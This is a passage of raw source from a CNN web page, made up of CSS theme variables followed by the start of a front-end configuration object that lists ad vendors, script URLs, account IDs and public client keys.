70-percent:#000000b3;--color-base-transparencies-black-60-percent:#00000099;--color-base-transparencies-black-50-percent:#00000080;--color-base-transparencies-black-40-percent:#00000066;--color-base-transparencies-black-30-percent:#0000004d;--color-base-transparencies-black-20-percent:#00000033;--color-base-transparencies-black-10-percent:#0000001a;--color-base-transparencies-black-0-percent:#00000000;--color-base-extended-yellow-800:#463100ff;--color-base-extended-yellow-700:#6c4e00ff;--color-base-extended-yellow-600:#9a7100ff;--color-base-extended-yellow-500:#c99400ff;--color-base-extended-yellow-400:#f0b100ff;--color-base-extended-yellow-300:#ffc248ff;--color-base-extended-yellow-200:#ffd088ff;--color-base-extended-yellow-100:#ffe4c3ff;--color-base-extended-teal-800:#0a2927ff;--color-base-extended-teal-700:#164541ff;--color-base-extended-teal-600:#346a66ff;--color-base-extended-teal-500:#4d9791ff;--color-base-extended-teal-400:#60b9b1ff;--color-base-extended-teal-300:#73dcd3ff;--color-base-extended-teal-200:#92f8f0ff;--color-base-extended-teal-100:#c6fbf6ff;--color-base-extended-red-800:#450000ff;--color-base-extended-red-700:#720000ff;--color-base-extended-red-600:#a20000ff;--color-base-extended-red-500:#d50000ff;--color-base-extended-red-400:#ff3f3fff;--color-base-extended-red-300:#ff7979ff;--color-base-extended-red-200:#ffaaaaff;--color-base-extended-red-100:#ffd5d5ff;--color-base-extended-purple-800:#2d1444ff;--color-base-extended-purple-700:#462166ff;--color-base-extended-purple-600:#62318eff;--color-base-extended-purple-500:#8143b8ff;--color-base-extended-purple-400:#9656d1ff;--color-base-extended-purple-300:#b28ae0ff;--color-base-extended-purple-200:#cdb6f1ff;--color-base-extended-purple-100:#e5dbf8ff;--color-base-extended-pink-800:#44010fff;--color-base-extended-pink-700:#6f041eff;--color-base-extended-pink-600:#9e092fff;--color-base-extended-pink-500:#d00f40ff;--color-base-extended-pink-400:#fc2f59ff;--color-base-extended-pink-300:#fc7989ff;--color-base-extended-pink-200:#fdaab2ff;--color-base-extended-pink-100:#fed6d9ff;--color-base-extended-orange-800:#401a00ff;--color-base-extended-orange-700:#612b00ff;--color-base-extended-orange-600:#984700ff;--color-base-extended-orange-500:#cd6200ff;--color-base-extended-orange-400:#ff7c00ff;--color-base-extended-orange-300:#ff9360ff;--color-base-extended-orange-200:#ffb9a1ff;--color-base-extended-orange-100:#ffdbd0ff;--color-base-extended-green-800:#0b2f1dff;--color-base-extended-green-700:#1b5437ff;--color-base-extended-green-600:#2b7a53ff;--color-base-extended-green-500:#3da672ff;--color-base-extended-green-400:#4bc88aff;--color-base-extended-green-300:#58e59eff;--color-base-extended-green-200:#97fbc3ff;--color-base-extended-green-100:#c9fdddff;--color-base-extended-blue-800:#041443ff;--color-base-extended-blue-700:#0c266eff;--color-base-extended-blue-600:#173da4ff;--color-base-extended-blue-500:#2152d5ff;--color-base-extended-blue-400:#3061f2ff;--color-base-extended-blue-300:#7b8ff7ff;--color-base-extended-blue-200:#aeb8faff;--color-base-extended-blue-100:#d7dbfcff;--color-base-neutral-800:#0c0c0cff;--color-base-neutral-700:#262626ff;--color-base-neutral-600:#404040ff;--color-base-neutral-500:#6e6e6eff;--color-base-neutral-400:#b1b1b1ff;--color-base-neutral-300:#e6e6e6ff;--color-base-neutral-200:#f8f8f8ff;--color-base-neutral-100:#ffffffff;--color-base-brand-travel-100:#f06c00ff;--color-base-brand-underscored-100:#6a29d5ff;--color-base-brand-politics-100:#3061f3ff;--color-base-brand-business-100:#66c9afff;--color-base-brand-core-red-100:#cc0000ff;--color-base-transparencies-white-persistent-90-percent:#ffffffe6;--color-base-transparencies-white-persistent-80-percent:#ffffffcc;--color-base-transparencies-black-persistent-50-percent:#00000080;--color-base-transparencies-white-persistent-70-percent:#ffffffb3;--color-base-transparencies-white-persistent-60-percent:#ffffff99;--color-base-transparencies-white-persistent-50-percent:#ffffff80;--color-base-transparencies-white-persistent-40-percent:#ffffff66;--color-base-transparencies-white-persistent-30-percent:#ffffff4d;--color-base-transparencies-black-persistent-40-percent:#00000066;--color-base-transparencies-white-persistent-20-percent:#ffffff33;--color-base-transparencies-black-persistent-70-percent:#000000b3;--color-base-transparencies-white-persistent-10-percent:#ffffff1a;--color-base-transparencies-black-persistent-90-percent:#000000e6;--color-base-transparencies-black-persistent-80-percent:#000000cc;--color-base-transparencies-white-persistent-0-percent:#ffffff00;--color-base-transparencies-black-persistent-0-percent:#00000000;--color-base-transparencies-black-persistent-10-percent:#0000001a;--color-base-transparencies-black-persistent-60-percent:#00000099;--color-base-transparencies-black-persistent-20-percent:#00000033;--color-base-transparencies-black-persistent-30-percent:#0000004d;--color-base-brand-core-red-200:#a4001eff;--color-base-brand-core-red-300:#ff3f3fff;--spacing-02:2px;--spacing-72:72px;--spacing-80:80px;--spacing-none:0;--spacing-04:4px;--spacing-08:8px;--spacing-10:12px;--spacing-16:16px;--spacing-24:24px;--spacing-32:32px;--spacing-40:40px;--spacing-48:48px;--spacing-56:56px;--spacing-64:64px;--border-radius-none:0;--border-radius-32:32px;--border-radius-28:28px;--border-radius-24:24px;--border-radius-20:20px;--border-radius-circle:100px;--border-radius-12:12px;--border-radius-16:16px;--border-radius-08:8px;--border-radius-06:6px;--border-radius-02:2px;--border-radius-04:4px;--size-height-04:4px;--size-height-48:48px;--size-height-08:8px;--size-height-12:12px;--size-height-20:20px;--size-height-16:16px;--size-height-24:24px;--size-height-28:28px;--size-height-32:32px;--size-height-36:36px;--size-height-40:40px;--size-height-56:56px;--size-height-64:64px;--size-height-72:72px;--size-height-80:80px;--theme-paragraph__font-family:var(--web-large-type-body-2-400-font-family);--theme-background:#0c0c0c;--theme-divider:#404040;--theme-copy:#404040;--theme-copy-accent:#e6e6e6;--theme-copy-accent-hover:#ffffff;--theme-icon-color:#e6e6e6;--theme-icon-color-hover:#ffffff;--theme-ad-slot-background-color:#0c0c0c;--theme-ad-slot-text-color:#b1b1b1;--theme-ad-slot-text-hover:#ffffff;--theme-font-family:cnn_sans_display,helveticaneue,Helvetica,Arial,Utkal,sans-serif;--theme-searchbox-border:#b1b1b1;--theme-copy-follow:#ffffff;--theme-article-spacing-top:0px;--theme-link-color-hover:#6e6e6e;--theme-color-link:#0c0c0c;--theme-button-color:#6e6e6e;--theme-button-color-hover:#cc0000;--theme-edition-picker-link:#e6e6e6;--theme-underline-skip-ink:auto;--theme-paragraph__font-size:16px;--theme-paragraph__line-height:26px;--theme-paragraph__font-size--from-small:var(--theme-paragraph__font-size);--theme-paragraph__line-height--from-small:var(--theme-paragraph__line-height);--theme-paragraph__link-color:#0c0c0c;--theme-paragraph__link-decoration:underline;--theme-paragraph__link-decoration-color:var(--theme-color-link);--theme-paragraph__link-decoration-thickness:1px;--theme-paragraph__hover-link-decoration:none;--theme-paragraph__hover-link-offset:4px;--theme-header__hover-item-hover:var(--theme-background);--theme-header__item-link-color:#e6e6e6;--theme-header__item-link-hover-color:#ffffff;--theme-header__item-link-hover-background-color:transparent;--theme-header__mobile-dropdown-border-color:var(--theme-divider);--theme-header__mobile-dropdown-background:#0c0c0c;--theme-header__item-link-line-height:40px;--theme-header__dropdown-background:#0c0c0c;--theme-header__dropdown-border-color:var(--theme-divider);--theme-header__login-button:#ffffff;--theme-headline__font-size:24px;--theme-headline__line-height:30px;--theme-headline__text-color:#0c0c0c;--theme-headline-sponsorship__lateral-margin:0;--theme-headline__font-weight:700;--theme-headline__margin-bottom:16px;--theme-headline__font-family:cnn_sans_display,helveticaneue,Helvetica,Arial,Utkal,sans-serif;--theme-headline__padding-bottom:48px;--theme-headline__padding-bottom-viewport-large:64px;--theme-headline__teaser-font-size:16px;--theme-headline__teaser-line-height:normal;--theme-headline__teaser-margin-top:0;--theme-headline__teaser-margin-botton:0;--theme-section-headline__font-size:36px;--theme-section-headline__line-height:42px;--theme-section-headline__text-color:#0c0c0c;--theme-section-headline__font-weight:700;--theme-section-headline__font-family:cnn_sans_display,helveticaneue,Helvetica,Arial,Utkal,sans-serif;--theme-section-headline__margin-bottom:0;--theme-section-headline-text__margin-top:16px;--theme-section-headline-text__margin-bottom:18px;--theme-section-headline-teaser__font-size:inherit;--theme-section-headline-teaser__color:inherit;--theme-subheader-h2__font-size:24px;--theme-subheader-h3__font-size:20px;--theme-subheader-h4__font-size:18px;--theme-subheader-h5__font-size:16px;--theme-subheader-h6__font-size:14px;--theme-subheader-h2__line-height:30px;--theme-subheader-h3__line-height:26px;--theme-subheader-h4__line-height:24px;--theme-subheader-h5__line-height:22px;--theme-subheader-h6__line-height:20px;--theme-subheader__font-family:cnn_sans_display,helveticaneue,Helvetica,Arial,Utkal,sans-serif;--theme-subheader__font-weight:700;--theme-iframe__display:block;--theme-list__link-decoration:underline;--theme-container__font-family:cnn_sans_display,helveticaneue,Helvetica,Arial,Utkal,sans-serif;--theme-container__font-weight:400;--theme-container-color--hover:#0c0c0c;--theme-container-image-color--hover:rgba(12, 12, 12, 0.4);--theme-container-text-decoration--hover:underline;--theme-container-image-opacity--hover:0.5;--theme-container-margin-bottom-default:24px;--theme-container-margin-bottom-600:48px;--theme-container-title__border-color:#e6e6e6;--theme-container-title__border-decorator-initial-width:16px;--theme-container-title__margin-bottom:0;--theme-container-title__margin-bottom-grid-4:0;--theme-container-title__text-size:12px;--theme-container-title__arrow-color--initial:#ffffff;--theme-container-title__arrow-size:16px;--theme-container-title__arrow-top-pos:0;--theme-container-link__background-color:inherit;--theme-container-item__margin-bottom-feature-list:32px;--theme-container__margin-bottom-grid-3:24px;--theme-container__margin-bottom-feature-grid-3:24px;--theme-container-title-emphatic__font-size:24px;--theme-container-title-emphatic__line-height:30px;--theme-container-lead-title__font-family:cnn_sans_display,helveticaneue,Helvetica,Arial,Utkal,sans-serif;--theme-container-lead-title__font-weight:700;--theme-container-lead-title__font-size:20px;--theme-container-lead-title__line-height:24px;--theme-container-lead-title-mobile__font-size:16px;--theme-header-mobile-nav-border-color:transparent;--theme-header-item-container-color:#262626;--theme-header-subnav-section-title-color:#ffffff;--theme-text-banner__gradient-1:#cdb6f1;--theme-text-banner__gradient-2:#e5dbf8;--theme-zone__padding-bottom-default:64px;--theme-zone__padding-bottom-small:64px;--theme-zone__margin-bottom-default:48px;--theme-zone__margin-top:-32px;--theme-zone-title__font-family:cnn_sans_display,helveticaneue,Helvetica,Arial,Utkal,sans-serif;--theme-zone-title__font-size:24px;--theme-zone-title__font-weight:700;--theme-zone-title__line-height:30px;--theme-zone-title__font-size-medium-plus:30px;--theme-zone-title__line-height-medium-plus:30px;--theme-zone-title__link-decoration:none;--theme-zone-title__hover-link-decoration:underline;--social-sharing-display:block;--social-sharing-margin-top:16px;--theme-hero-headline__font-size:36px;--theme-hero-headline__line-height:42px;--social-sharing-open-close-fill:#4d4d4d;--social-sharing-facebook-fill:#0c0c0c;--social-sharing-twitter-fill:#0c0c0c;--social-sharing-email-fill:#0c0c0c;--social-sharing-link-fill:#0c0c0c;--theme-disclaimer-background:#e6e6e6;--theme-disclaimer-color:#4d4d4d;--theme-disclaimer-style:normal;--theme-disclaimer-link-color:#6a29d5;--theme-disclaimer-link-weight:400;--theme-disclaimer-fontsize-sm:14px;--theme-disclaimer-fontsize-xl:16px;--theme-disclaimer-lineheight-sm:22.75px;--theme-disclaimer-lineheight-xl:25.6px;--theme-newsletter-form-disable-button:#c0c0c0;--theme-paragraph-fontsize-sm:14px;--theme-paragraph-fontsize-xl:16px;--theme-paragraph-lineheight-sm:22.75px;--theme-paragraph-lineheight-xl:25.6px;--theme-main-wrapper-rail-width:360px;--theme-main-wrapper-right-rail-width:300px;--theme-main-wrapper-column-gap-medium-width:40px;--theme-main-wrapper-column-gap-large-width:50px;--theme-primary-logo-fill:#cc0000;--theme-secondary-logo-fill:white;--theme-subheader-anchor-display:inline;--theme-primary-layout-color:#fafafa;--theme-secondary-layout-color:#fff;--theme-video-playlist-status-label-color:rgba(12, 12, 12, 0.7);--theme-primary:#cc0000;--theme-container-text-decoration-color--hover:var(--theme-color-link);--theme-container-title__border-decorator-color:#cc0000;--theme-container-title__arrow-color--hover:var(--theme-color-link);--theme-video-playlist-item-hover-color:#00c59e;--theme-footer-disclaimer-color:#ffffff;--theme-footer-disclaimer-weight:400}h1,h2,h3,h4,h5{font-weight:700}@media (min-width:960px){:root{--theme-headline__font-size:42px;--theme-headline__line-height:48px;--theme-section-headline__font-size:42px;--theme-section-headline__line-height:48px;--theme-section-headline__margin-bottom:16px;--theme-subheader-h2__font-size:30px;--theme-subheader-h3__font-size:24px;--theme-subheader-h4__font-size:20px;--theme-subheader-h2__line-height:36px;--theme-subheader-h3__line-height:30px;--theme-subheader-h4__line-height:26px;--theme-container-margin-bottom-600:0;--theme-container__margin-bottom-feature-grid-3:0}}@media (max-width:959px){:root{--social-sharing-display:none}}@media (min-width:480px){:root{--theme-section-headline-text__margin-bottom:20px;--theme-container__margin-bottom-grid-3:32px;--theme-container__margin-bottom-feature-grid-3:0;--theme-headline__margin-bottom:20px}}@media (min-width:1280px){:root{--theme-section-headline-text__margin-bottom:22px;--theme-hero-headline__font-size:42px;--theme-hero-headline__line-height:48px;--theme-headline__margin-bottom:22px}} window.env={\"AD_SLOT_CLIENT_INJECTOR_REGISTRY\":\"https://cdn.cnn.com/ads/cnn/cnn_quantum_leaf.json\",\"AD_SLOT_CLIENT_INJECTOR_REGISTRY_EDITION\":\"https://cdn.cnn.com/ads/cnni/cnni_quantum_leaf.json\",\"AD_SLOT_CLIENT_INJECTOR_LIVE_STORY_REGISTRY\":\"https://i.cdn.turner.com/ads/cnn_2/cnn_livestory_leaf.json\",\"AD_SLOT_CLIENT_INJECTOR_LIVE_STORY_REGISTRY_EDITION\":\"https://i.cdn.turner.com/ads/cnni_2/cnni_livestory_leaf.json\",\"ADFUEL_BUSINESS_SRC\":[\"/media/sites/js/bundles/business-adfuel-38c3a51cb1880858b1308ec1a14d8de5c696b1b35fe7d6abb0a383df00dd8547.min.js\",\"/media/sites/js/bundles/business-adfuel-body-91c313323a672473cdfbcb00f55af4039da029b40bc3a12d45d05a8c29dc29c3.min.js\"],\"ADFUEL_BUSINESS_EDITION_SRC\":[\"/media/sites/js/bundles/business-edition-adfuel-0b7addfe5972af083cc854d53286920d9ab4ac90d2916a8efedac8de79d491b2.min.js\",\"/media/sites/js/bundles/business-edition-adfuel-body-28aede2ce001b8f0b44489ae0fcfab51f9ee829d2fd94312de6005dde936311f.min.js\"],\"ADFUEL_CNN_SRC\":[\"/media/sites/js/bundles/cnn-adfuel-72c4d6ac8cba76b42d66c53fdf9da961e808ba194d54e14cb089d0db020f59d1.min.js\",\"/media/sites/js/bundles/cnn-adfuel-body-33700b31f265ed582725d697cc87c4c02f7bcc2fe37e27f29faac3ee296d8b95.min.js\"],\"ADFUEL_CNN_EDITION_SRC\":[\"/media/sites/js/bundles/cnn-edition-adfuel-b3a035158b6e369456f2e1a3ed7d6c934ef4f54ebcfe5a4c8b0100dfe6b53337.min.js\",\"/media/sites/js/bundles/cnn-edition-adfuel-body-d41ccb193ab9d4fe8c814d7dc94a7d3416edb9647584caf9600f9864d4286006.min.js\"],\"ADFUEL_ESPANOL_SRC\":[\"/media/sites/js/bundles/espanol-adfuel-848385c6a2b7d4bd6a04127e2f6f9a9de65b8573cde2e78abf8413f8ca7d8c32.min.js\",\"/media/sites/js/bundles/espanol-adfuel-9751563d0fbf7584761794d4d756bedae22d035b3050a5586fdc697d3bf07cfb.min.js\",\"/media/sites/js/bundles/espanol-adfuel-body-6b8adf5401ab514b72f7d764828c4cc6611edd5cc3d6a57b5a590ed852911327.min.js\",\"/media/sites/js/bundles/espanol-adfuel-body-d50390c69936d46c17b43900b4a3504debb4589cea41c903b2dea97ca9b05160.min.js\"],\"ADOBE_LAUNCH_SRC\":\"https://lightning.cnn.com/launch/7be62238e4c3/97fa00444124/launch-2878c87af5e3.min.js\",\"ADOBE_LAUNCH_BUSINESS_ENABLED_SECTIONS\":[\"business\",\"markets\"],\"ADVANCED_VIDEO_ENABLED\":true,\"AIRSHIP_APP_KEY\":\"3wrwsS87S6OIW06Lq4MVIQ\",\"AIRSHIP_ENABLED\":false,\"AIRSHIP_SRC\":\"https://aswpsdkus.com/notify/v1/ua-sdk.min.js\",\"AIRSHIP_TOKEN\":\"MTozd3J3c1M4N1M2T0lXMDZMcTRNVklROmRSb3lkd0lHZ0NHanFMeElRYVpjaGNQQVBrd2k5NGRKa1NobWR2SjBIUjg\",\"AIRSHIP_VAPID_PUBLIC_KEY\":\"BHJLBg0NxOGDHKXf0Bepz55qLpKT674Z6XiGZxVbW0p67B6cpiBzvOo2vSWTtnEGHjmILIuDmWkldwLOv4bwwz8=\",\"AIRSHIP_WEB_SITE_PUSH_ID\":\"web.com.cnn.redalert\",\"AIRSHIP_WORKER\":\"/service-worker.js\",\"AIRSHIP_CORE_ENABLED\":true,\"APPLE_NEWS_MANAGER_ENABLED\":true,\"ALERTS_HUB_ENABLED\":{\"cnn\":true,\"es\":false},\"ALERTS_HUB_BASIC_REPORTING_ENABLED\":true,\"ALERT_BANNER_ENABLED\":{\"cnn\":false,\"es\":false},\"APPLE_NEWS_LOGO_NAME_TRAVEL\":\"https://media.cnn.com/api/v1/images/cnn/apple-news/cnn-travel-light.png\",\"APPLE_NEWS_LOGO_NAME_STYLE\":\"https://media.cnn.com/api/v1/images/stellar/prod/cnn-style-light.png\",\"APPLE_NEWS_LOGO_NAME_QUOTE\":\"https://media.cnn.com/api/v1/images/cnn/apple-news/quote-light.png\",\"ARKOSE_LOGIN_KEY\":\"A81F9530-112A-47B2-BA4B-8CB41D7C6DD6\",\"ARKOSE_LOGIN_SRC\":\"https://wbd-api.arkoselabs.com/v2/A81F9530-112A-47B2-BA4B-8CB41D7C6DD6/api.js\",\"ARKOSE_NEWSLETTERS_KEY\":\"12FB7448-F055-4621-BC01-1DDF7CB3945A\",\"ARKOSE_NEWSLETTERS_SRC\":\"https://wbd-api.arkoselabs.com/v2/12FB7448-F055-4621-BC01-1DDF7CB3945A/api.js\",\"ARKOSE_REGISTRATION_KEY\":\"95218C8B-B84E-413C-B875-785B35F92134\",\"ARKOSE_REGISTRATION_SRC\":\"https://wbd-api.arkoselabs.com/v2/95218C8B-B84E-413C-B875-785B35F92134/api.js\",\"AUTO_REFRESH_INTERVAL\":\"20\",\"BREAKING_NEWS_BANNER_CMS_ENABLED\":true,\"NATIVO_SRC\":\"https://s.ntv.io/serve/load.js\",\"CHARTBEAT_SRC\":\"https://static.chartbeat.com/js/chartbeat_mab.js\",\"CLAY_SITE_HOSTS_MAP\":{\"cnn\":\"cms.cnn.com\"},\"RENDER_SITE_HOSTS_MAP\":{\"render00.prod.clay.cnn.io\":\"cms.cnn.com\"},\"CMS_EVENT_BUS_BATCH_SIZE\":\"10\",\"CNN_DATAVIZ_API\":\"https://production.dataviz.cnn.io\",\"CNN_DIGITAL_PROFILE_PUBLICIST\":\"Emily Kuhn\",\"COLLABORATION_PORT\":\"4001\",\"COLLABORATION_SITE_HOSTS_MAP\":{\"cms.cnn.com\":\"collaboration-prod-rn0723c0-cnn.content-hub.cnn-cms.com\"},\"COLLABORATION_EXCLUDED_TYPES\":[\"audio\",\"custom\",\"feed\",\"interactive\",\"livestory\",\"profile\",\"scratchpad\",\"search\",\"static\",\"unknown\",\"user_management\"],\"ENABLE_REALTIME_COLLABORATION_SERVICE\":false,\"CONTENT_HUB_APP_VERSION\":\"v5.11.0\",\"CONTENT_HUB_ENV\":\"prod\",\"CONTENT_HUB_PROJECT_NAME\":\"content-hub\",\"CONTENT_HUB_UNIQUE_DEPLOYMENT_KEY\":\"rn0723c0\",\"ENABLE_CONTENT_RECS\":true,\"CONTENT_RECS_API\":\"https://prod.di.api.cnn.io/recommendations\",\"CONTENT_RECS_RELATED_TENANT_ID\":\"read-next-from-article.mobileweb\",\"CONTENT_RECS_YOUR_TENANT_ID\":\"your-cnn.web\",\"CONTENT_RECS_POPULAR_TENANT_ID\":\"popular.content-recs\",\"CONVIVA_CUSTOMER_KEY\":\"a6709203f34992a5095d2bc7ceaf2ec504f651a8\",\"DALTON_ENV\":\"production\",\"DALTON_COOKIE_VERSION\":\"v1.1\",\"DAM_API_HOST\":\"https://dam2.cms.cnn.com\",\"DAM_ACCESS_KEY\":\"b28f4002267c430b85918a3fdf75c0ea\",\"DAM_DEFAULT_PATH\":\"/stellar/prod\",\"DAM_SERVING_HOST\":\"https://media.cnn.com\",\"DALTON_API_HOST\":\"https://audience.cnn.com\",\"DALTON_TKN_HEADER_CHECK_ENABLED\":true,\"DISTROSCALE_SRC\":\"https://a.jsrdn.com/creatives/23053/cw.js\",\"EDIT_MODE_DATADOG_CLIENT_TOKEN\":\"pub64c258ed09bbe1a3712a8692522a5fbf\",\"DEDUPLICATION_ENABLED\":false,\"DIANOMI_SCRIPT_SRC\":\"https://www.dianomi.com/js/contextfeed.js\",\"DISPLAY_WORDCOUNT_ON_CARDS\":true,\"DISPLAY_VIDEO_DURATION_ON_CARDS\":true,\"ELECTION_MAP_PROOF_OF_CONCEPT_COMPONENT_ENABLED\":false,\"ENABLE_AD_LAZY_LOADING\":true,\"ENABLE_AD_FEEDBACK_DISPLAY_ADS\":true,\"ENABLE_AD_FEEDBACK_VIDEO_ADS\":true,\"ADFUEL_CONFIGS\":{\"domestic\":{\"ADFUEL\":{\"AUTO_DISPATCH\":true,\"DEFAULT_TIMEOUT\":800,\"DEFAULT_DESKTOP_TIMEOUT\":800,\"DEFAULT_MOBILE_TIMEOUT\":800,\"IFRAME_TITLE\":\"advertisement\",\"NETWORK_ID\":\"8663477\",\"REFRESH_ON_FOCUS_ONLY\":false,\"LAZY_LOAD_FETCH_PERCENT\":500,\"LAZY_LOAD_RENDER_PERCENT\":200,\"LAZY_LOAD_MOBILE_SCALING\":2,\"COLLAPSE_EMPTY_DIVS\":true,\"DEBUG\":false,\"SITE_OBJECT\":\"CNN\",\"ACTIVE_MODULES\":[]},\"A9\":{\"SLOTNAMES\":{\"PREPEND_ADUNIT\":false,\"MIDROLL\":\"aps-midroll\",\"PREROLL\":\"aps-preroll\"},\"TIMEOUTS\":{\"MOBILE\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":750,\"INITIAL\":750}},\"DESKTOP\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":1150,\"INITIAL\":1150}}},\"DEBUG\":false,\"ACCOUNT_IDS\":{\"INTL\":\"3288\",\"DOM\":\"3159\"}},\"AUI\":{\"SITE_VENDORS\":{\"DOM\":[\"AppNexus\",\"Freewheel\",\"LiveRamp\",\"PubMatic\",\"Rubicon\",\"Telaria\"],\"INTL\":[\"AppNexus\",\"Freewheel\",\"LiveRamp\",\"PubMatic\",\"Rubicon\",\"Telaria\"]},\"VENDORS\":{\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"},\"ID5\":{\"COOKIE_NAME\":\"\",\"URL\":\"\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"SpotX\":{\"COOKIE_NAME\":\"hkgc\",\"URL\":\"https://sync.search.spotxchange.com/audience_id\"},\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"}}},\"BEEMRAY\":{\"DEBUG\":false,\"CUSTOMER_ID\":\"cnn\",\"API_KEY\":\"39a34d8d-dd1d-4fbf-aa96-fdc5f0329451\"},\"BLOCKTHROUGH\":{\"DEBUG\":false},\"CEP\":{\"DEBUG\":false},\"CONSOLE_TOOL\":{\"DEBUG\":false,\"HOTKEY\":[\"Control\",\"Shift\",\"Z\"]},\"CREATIVE_REVIEW\":{\"DEBUG\":false,\"HOTKEY\":\"^ d o h $\"},\"CRITEO\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DESKTOP_ZONES\":{},\"MOBILE_TIMEOUT\":750,\"MOBILE_ZONES\":{},\"MULTISIZE_FIRST\":\"F\",\"MULTISIZE_LARGEST\":\"L\",\"MULTISIZE_ALL\":\"A\",\"MULTISIZE_METHOD\":\"L\",\"TIMEOUT\":750},\"FASTLANE\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DOM_ACCOUNT_ID\":11078,\"INTL_ACCOUNT_ID\":11016,\"MOBILE_TIMEOUT\":750,\"TIMEOUT\":750},\"GUID\":{\"DEBUG\":false},\"IAS\":{\"ACCOUNT_IDS\":{\"DOM\":925660,\"INTL\":925660},\"DEBUG\":false},\"IX\":{\"DEBUG\":false,\"SCRIPT_KEY\":{\"DOM\":null,\"INTL\":null},\"IDENTITY\":\"\"},\"IVR\":{\"DEFAULT_DISPLAY_PERCENT\":50,\"DEFAULT_DISPLAY_MILLISECONDS\":35000,\"DEBUG\":false},\"KRUX\":{\"DEBUG\":false,\"DOM_CONTROLTAG\":\"ITb_4eqO\",\"INTL_CONTROLTAG\":\"teff71jyu\"},\"MALVERTISING\":{\"DEBUG\":false,\"SITE_VENDOR\":\"CleanIO\",\"SCRIPT_SRC\":\"//cadmus.script.ac/d2uap9jskdzp2/script.js\"},\"PREBID\":{\"SEND_ALL_BIDS\":{\"INTL\":true,\"DOM\":true},\"VENDOR\":{\"IX\":{\"IDENTITY\":\"\",\"SITE_ID\":{\"DOM\":{\"DESKTOP\":{\"atf\":{\"728x90\":\"423255\",\"970x250\":\"423255\",\"970x90\":\"423255\",\"300x600\":\"423257\",\"300x250\":\"423257\"},\"btf\":{\"300x600\":\"423258\",\"300x250\":\"423258\",\"728x90\":\"423256\",\"970x250\":\"423256\",\"970x90\":\"423256\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"423259\",\"300x250\":\"423261\"},\"btf\":{\"300x250\":\"423260\",\"320x50\":\"423262\"}},\"VIDEO\":0,\"OUTSTREAM\":{\"DESKTOP\":0,\"MOBILE\":0}},\"INTL\":{\"DESKTOP\":{\"atf\":{\"728x90\":\"341959\",\"970x250\":\"341960\",\"970x90\":\"341961\",\"300x600\":\"341962\",\"300x250\":\"341963\"},\"btf\":{\"300x600\":\"341965\",\"300x250\":\"341966\",\"728x90\":\"341967\",\"970x250\":\"341968\",\"970x90\":\"341969\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"341964\",\"300x250\":\"341970\"},\"btf\":{\"320x50\":\"341957\",\"300x250\":\"341971\"}},\"VIDEO\":0,\"OUTSTREAM\":{\"DESKTOP\":0,\"MOBILE\":0}}},\"OUTSTREAM\":{\"SITE_ID\":{\"DOM\":{\"DESKTOP\":0,\"MOBILE\":0},\"INTL\":{\"DESKTOP\":0,\"MOBILE\":0}}},\"VIDEO\":{\"WIDTH\":640,\"HEIGHT\":480,\"MIMES\":[\"video/mp4\"],\"PROTOCOLS\":[2,3,5,6],\"SITE_ID\":{\"DOM\":{\"DESKTOP\":\"829396\",\"MOBILE\":\"829397\"},\"INTL\":{\"DESKTOP\":\"829396\",\"MOBILE\":\"829397\"}},\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":15,\"INTL\":15}}}}},\"RUBICON\":{\"ACCOUNT_ID\":{\"DOM\":\"11078\",\"INTL\":\"11016\"},\"SITE_ID\":{\"DOM\":{\"DESKTOP\":\"26792\",\"MOBILE\":\"42244\",\"VIDEO\":{\"DESKTOP\":0,\"MOBILE\":0}},\"INTL\":{\"DESKTOP\":\"78582\",\"MOBILE\":\"78584\",\"VIDEO\":{\"DESKTOP\":\"415330\",\"MOBILE\":\"430362\"}}},\"ZONE_MAPPING\":{\"DOM\":{\"DESKTOP\":{\"HP\":{\"btf\":\"154308\",\"atf\":\"106536\"},\"ROS\":{\"btf\":\"107752\",\"atf\":\"106830\"}},\"MOBILE\":{\"HP\":{\"btf\":\"2801022\",\"atf\":\"2801020\"},\"ROS\":{\"btf\":\"2801026\",\"atf\":\"2801024\"}},\"VIDEO\":{\"DESKTOP\":{\"HP\":{\"atf\":\"2319232\",\"btf\":\"2319232\"},\"ROS\":{\"atf\":\"2319232\",\"btf\":\"2319232\"}},\"MOBILE\":{\"HP\":{\"atf\":\"2419502\",\"btf\":\"2419502\"},\"ROS\":{\"atf\":\"2419502\",\"btf\":\"2419502\"}}}},\"INTL\":{\"DESKTOP\":{\"HP\":{\"btf\":\"650178\",\"atf\":\"650178\"},\"ROS\":{\"btf\":\"369850\",\"atf\":\"369850\"}},\"MOBILE\":{\"HP\":{\"btf\":\"369856\",\"atf\":\"369856\"},\"ROS\":{\"btf\":\"369856\",\"atf\":\"369856\"}},\"VIDEO\":{\"DESKTOP\":{\"HP\":{\"atf\":\"2341606\",\"btf\":\"2341606\"},\"ROS\":{\"atf\":\" 